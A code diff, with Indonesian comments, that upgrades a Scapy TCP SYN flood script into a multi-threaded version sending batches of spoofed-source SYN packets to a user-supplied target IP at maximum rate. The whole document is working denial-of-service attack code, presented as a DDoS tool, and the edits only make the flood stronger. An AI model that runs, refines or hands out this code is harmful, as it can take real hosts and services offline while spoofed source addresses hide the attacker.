@@ -1,23 +1,58 @@
 from scapy.all import IP, TCP, send, RandIP, RandShort
+import threading
 import time
 
 # --- KONFIGURASI ---
 target_ip = "192.168.0.118"  # GANTI DENGAN IP TARGET ANDA
-target_port = 80             # Menyerang port Web Server
 # -------------------
 
-print(f"--- Memulai TCP SYN Flood (DDoS) ke {target_ip}:{target_port} ---")
+# Konfigurasi multi-threading
+NUM_THREADS = 8
+PACKETS_PER_BATCH = 50
+
+print(f"--- Memulai TCP SYN Flood (Multi-threaded) ke {target_ip} ---")
+print(f"Threads: {NUM_THREADS} | Batch Size: {PACKETS_PER_BATCH} packets")
 print("Tekan Ctrl+C untuk berhenti.")
 
-try:
-    while True:
-        # Membuat paket IP dengan Source IP acak (Spoofing)
-        # Membuat paket TCP dengan Source Port acak dan Flag 'S' (SYN)
-        packet = IP(src=RandIP(), dst=target_ip) / \
-                 TCP(sport=RandShort(), dport=target_port, flags="S")
+stop_attack = False
 
-        # Kirim paket (verbose=0 biar terminal gak berisik)
-        send(packet, verbose=0)
+def attack_thread(thread_id):
+    """Thread function untuk mengirim batch paket TCP SYN"""
+    global stop_attack
+    
+    # Pre-build packet batch untuk efisiensi
+    packets = []
+    for _ in range(PACKETS_PER_BATCH):
+        # Gunakan random port untuk serangan lebih efektif
+        packet = IP(src=RandIP(), dst=target_ip) / \
+                 TCP(sport=RandShort(), dport=RandShort(), flags="S")
+        packets.append(packet)
+    
+    print(f"[Thread {thread_id}] Started")
+    
+    while not stop_attack:
+        try:
+            # Kirim batch paket sekaligus dengan inter=0 untuk kecepatan maksimal
+            send(packets, verbose=0, inter=0)
+        except Exception as e:
+            if not stop_attack:
+                print(f"[Thread {thread_id}] Error: {e}")
+            break
+
+try:
+    # Buat dan jalankan thread
+    threads = []
+    for i in range(NUM_THREADS):
+        thread = threading.Thread(target=attack_thread, args=(i,), daemon=True)
+        thread.start()
+        threads.append(thread)
+    
+    # Keep main thread alive
+    while True:
+        time.sleep(1)
 
 except KeyboardInterrupt:
-    print("\n--- Serangan TCP dihentikan ---")
+    print("\n--- Menghentikan serangan... ---")
+    stop_attack = True
+    time.sleep(2)  # Beri waktu thread untuk berhenti
+    print("--- Serangan TCP dihentikan ---")
